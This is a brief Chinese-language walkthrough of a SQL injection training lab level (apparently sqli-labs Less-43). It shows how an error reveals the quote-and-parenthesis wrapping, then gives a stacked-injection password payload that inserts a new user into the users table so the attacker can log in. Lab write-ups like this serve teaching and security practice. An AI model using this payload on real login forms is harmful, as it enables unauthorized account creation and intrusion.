# POST-Error based-string-Stacked with twist  
TAG：POST型注入、堆叠注入  
## 漏洞利用
![less43_1](images\less43_1.png)  
用less42的方法触发报错，获得参数包裹方式：单引号+小括号  
![less43_2](images\less43_2.png)  
  
使用堆叠注入添加一个用户  
Payload-password:```1');insert into users(id,username,password) values ('22','less43','hello')--+```  
![less43_3](images\less43_3.png)  
  
成功创建用户并完成了登陆  
![less43_4](images\less43_4.png)  